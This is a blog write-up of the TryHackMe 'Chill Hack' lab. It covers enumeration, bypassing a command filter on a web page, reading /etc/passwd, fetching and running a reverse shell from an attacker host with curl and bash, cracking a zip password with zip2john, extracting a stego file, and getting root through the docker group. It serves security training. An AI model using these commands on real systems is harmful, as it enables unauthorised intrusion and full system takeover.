---
title: "TryHackMe - Chill Hack"
author: Nasrallah
description: ""
date: 2022-06-03 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, steganography, commandinjection, gobuster, john, cracking]
img_path: /assets/img/tryhackme/chillhack/
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Chill Hack](https://tryhackme.com/room/chillhack) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
map scan report for 10.10.102.48 (10.10.102.48)                                                                                                              
Host is up (0.25s latency).                                                                                                                                   
Not shown: 997 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.31.131 
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text 
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Found 3 open ports

### FTP

From the nmap scan, we see that ftp allows anonymous login.

![](1.png)

Found *note.txt* file, and downloaded it with `get note.txt`.

### Web

Let's navigate to the webpage.

![](2.png)

Nothing interesting, let's run a gobuster scan.

#### Gobuster.

We run a directory scan with the following command. `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/`

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.102.48/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
 09:57:28 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.102.48/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.102.48/fonts/]
/images               (Status: 301) [Size: 313] [--> http://10.10.102.48/images/]
/index.html           (Status: 200) [Size: 35184]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.102.48/js/]    
/secret               (Status: 301) [Size: 313] [--> http://10.10.102.48/secret/]
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
```

Found a directory called **/secret**.

![](3.png)

It seems that we can execute command, let's try running a command like `ls`.

![](4.png)

Wow. The note we found earlier had the following: `Anurodh told me that there is some filtering on strings being put in the command -- Apaar`. So there is a command filter, that's why we can't run `ls`. Let's try another command.

![](5.png)

I run the command `whoami` and got `www-data` as a result.

If i tried to printout the `/etc/passwd` file i get blocked.

We can try the command `base64` to encode the content of the file and decode it later.

![](6.png)

We managed to get the encoded content, now let's decode using [cyberchef](https://gchq.github.io/CyberChef/)

![](7.png)

Great! Now we can see every user in the system.

Next, let's print the `index.php` file of the command execution page in order to see the filters.

![](8.png)

![](9.png)

We can see every word that is being filtered. We can see that the `curl` command is not black listed, so we can try to upload a reverse shell.


## **Foothold**

First, let's make our reverse shell payload.

![](10.png)

Now setup an http server using python: `python3 -m http.server 80` in the same directory of the file. 

Next go to the command execution page and run `curl http://{attacker_ip}/shell.sh -o /tmp/shell.sh`. This command will upload our shell to the target system and pur it in /tmp directory since it is world writable.

Now set up a listener on the attacker machine with `nc -lvnp 1234`

Back to the command execution page and run `bash</tmp/shell.sh`

If we go back to the listener we setup we should have received a reverse shell.

![](11.png)

I used the python pty trick to stabilize my shell.

## **Privilege Escalation**

### Anurodh

Pocking around the files in the machine, i found the following file.

![](12.png)

We got a message saying we need to "Look in the dark! You will find your answer".

The file attached to this message is "hacker-with-laptop_23-2147985341.jpg", and it is located in "/var/www/files/images/".

![](13.png)

Let's download the file to our machine and investigate it.

We need to setup a http server with python.

![](14.png)

And download the file with the following command: `wget http://10.10.102.48:8000/hacker-with-laptop_23-2147985341.jpg`

![](15.png)

Let's see if there is any hidden file in this image. We can use a tool called `stegseek` to do that.

![](16.png)

Great! There is a backup.zip file. Let's unzip it and see what's there.

![](17.png)

We need a password to unzip the file. Let's use `zip2john` to get a hash and crack the latter for a password.

![](18.png)

We got the password, now let's unzip the file.

![](19.png)

We got a file named `source_code.php`, let's see what it holds.

![](20.png)

We got a base64 encoded password and the username `Anurodh`. Let's decode the password and login to *Anurodh* account.

![](21.png)

Great! I managed to login to Anurodh account via ssh.

### Root

Run the command `id`.

![](22.png)

We that the user *anurodh* is in docker group, let's visit [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)

![](23.png)

We can run the command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` and become root.

![](24.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

https://gtfobins.github.io/gtfobins/docker/#shell
